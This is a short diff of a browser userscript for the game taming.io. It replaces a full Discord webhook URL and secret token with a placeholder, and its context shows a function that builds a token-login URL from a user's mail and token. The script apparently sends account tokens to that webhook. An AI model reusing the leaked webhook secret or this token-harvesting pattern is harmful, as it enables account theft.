@@ -9,7 +9,7 @@
 // @run-at       document-start
 // ==/UserScript==
 
-const webhook = 'https://discord.com/api/webhooks/1355973272268701887/DlXiFORa5AGfmatwuCFOc7ekgcCEbgYUJ0Du0JlXzP-mJ-GOKjKv034BDPlEW4RqtVrh';
+const webhook = 'https://discord.com/api/webhooks/....';
 
 function game_data(mail, token) {
     const url = `https://account.taming.io/tokenLogin?mail=${mail}&token=${token}`;
